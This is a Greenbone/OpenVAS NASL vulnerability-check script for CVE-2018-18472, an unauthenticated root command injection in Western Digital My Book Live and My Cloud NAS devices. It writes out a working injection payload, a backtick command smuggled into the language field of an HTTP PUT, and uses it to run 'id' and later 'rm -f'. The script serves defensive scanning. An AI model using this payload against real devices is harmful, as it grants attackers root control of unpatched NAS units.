# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141680");
  script_version("2021-07-02T06:34:34+0000");
  script_tag(name:"last_modification", value:"2021-07-02 06:34:34 +0000 (Fri, 02 Jul 2021)");
  script_tag(name:"creation_date", value:"2018-11-13 13:26:47 +0700 (Tue, 13 Nov 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-06-25 10:15:00 +0000 (Fri, 25 Jun 2021)");

  script_cve_id("CVE-2018-18472");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Western Digital My Book Live / My Cloud NAS RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mybook_live_http_detect.nasl", "gb_wd_mycloud_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wd/product/detected");

  script_tag(name:"summary", value:"Western Digital MyBook Live and some models of Western Digital My Cloud NAS
  contain a remotely exploitable vulnerability that lets anyone run commands on the device as root. The vulnerability
  exists in the language change and modify functionality in the REST API");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP PUT request and checks if the 'id' command can be
  executed.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.

  Note: My Book Live devices originally introduced to the market between 2010 and 2012. These products have been
  discontinued since 2014 and are no longer covered under the vendors device software support lifecycle. Therefore
  no fix will be provided.");

  script_xref(name:"URL", value:"https://www.wizcase.com/blog/hack-2018/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

# TODO: We currently can't use a mix of cpe:/h:western_digital and cpe:/h:wdc in get_app_port_from_cpe_prefix
# so the list below have been manually filled based on the models available at https://support.wdc.com/cat_products.aspx?ID=1

cpe_list = make_list(
"cpe:/o:western_digital:my_book_live_firmware", "cpe:/o:wdc:my_cloud_unknown_model_firmware",
"cpe:/o:wdc:my_cloud_firmware", "cpe:/o:wdc:wd_cloud_firmware",
"cpe:/o:wdc:my_cloud_mirror_firmware", "cpe:/o:wdc:my_cloud_pr2100_firmware",
"cpe:/o:wdc:my_cloud_pr4100_firmware", "cpe:/o:wdc:my_cloud_ex2ultra_firmware",
"cpe:/o:wdc:my_cloud_ex2_firmware", "cpe:/o:wdc:my_cloud_ex4_firmware",
"cpe:/o:wdc:my_cloud_ex2100_firmware", "cpe:/o:wdc:my_cloud_ex4100_firmware",
"cpe:/o:wdc:my_cloud_dl2100_firmware", "cpe:/o:wdc:my_cloud_dl4100_firmware");

if (!infos = get_app_port_from_list(cpe_list: cpe_list, service:"www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

vt_strings = get_vt_strings();
file = vt_strings["default_rand"] + ".txt";

data = 'language=en_US`id > /var/www/' + file + '`';
url = '/api/1.0/rest/language_configuration';

header = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, data: data, add_headers: header, method:"PUT");
res = http_keepalive_send_recv(port: port, data: req);

req = http_get(port: port, item: "/" + file);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = 'It was possible to execute the "id" command.\n\nResult:\n' +
           egrep(pattern: 'uid=[0-9]+.*gid=[0-9]+.*', string: res);
  security_message(port: port, data: report);

  # Cleanup
  data = 'language=en_US`rm -f /var/www/' + file + '`';
  req = http_post_put_req(port: port, url: url, data: data, add_headers: header, method: "PUT");
  res = http_keepalive_send_recv(port: port, data: req);

  exit(0);
}

exit(99);
